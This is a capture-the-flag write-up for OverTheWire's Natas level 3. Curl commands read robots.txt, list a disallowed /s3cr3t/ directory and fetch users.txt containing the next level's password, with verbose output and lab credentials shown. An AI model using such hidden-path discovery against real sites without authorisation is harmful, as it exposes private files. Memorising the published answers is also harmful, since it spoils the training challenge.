### natas3 pswd: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

```bash
curl -v -s -X POST http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org

#<h1>natas3</h1>
#<div id="content">
#There is nothing on this page
#<!-- No more information leaks!! Not even Google will find it this time... -->
#</div>
#
```

Not even google => robot.txt

```bash
curl -v -s -c cookie.txt -X POST http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org/robots.txt
# User-agent: *
# Disallow: /s3cr3t/
# * Connection #0 to host natas3.natas.labs.overthewire.org:80 left intact

curl -v -s -b cookie.txt  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org//s3cr3t/

# <h1>Index of /s3cr3t</h1>
#   <table>
#    <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last # modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
#    <tr><th colspan="5"><hr></th></tr>
# <tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td # align="right">  - </td><td>&nbsp;</td></tr>
# <tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td # align="right">2026-06-14 17:38  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
#    <tr><th colspan="5"><hr></th></tr>
# </table>
# 

curl -v -s -b cookie.txt  http://natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH@natas3.natas.labs.overthewire.org//s3cr3t/users.txt
* Host natas3.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 13.53.215.123
*   Trying 13.53.215.123:80...
* Established connection to natas3.natas.labs.overthewire.org (13.53.215.123 port 80) from 10.0.2.15 port 58230 
* using HTTP/1.x
* Server auth using Basic with user 'natas3'
> GET //s3cr3t/users.txt HTTP/1.1
> Host: natas3.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMzOjNncWlzR2RSMHBqbTZ0cGtES2RJV08yaFN2Y2hMZVlI
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Fri, 19 Jun 2026 12:50:47 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Last-Modified: Sun, 14 Jun 2026 17:38:50 GMT
< ETag: "28-6543a2ecbfeee"
< Accept-Ranges: bytes
< Content-Length: 40
< Content-Type: text/plain
< 
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
* Connection #0 to host natas3.natas.labs.overthewire.org:80 left intact
```

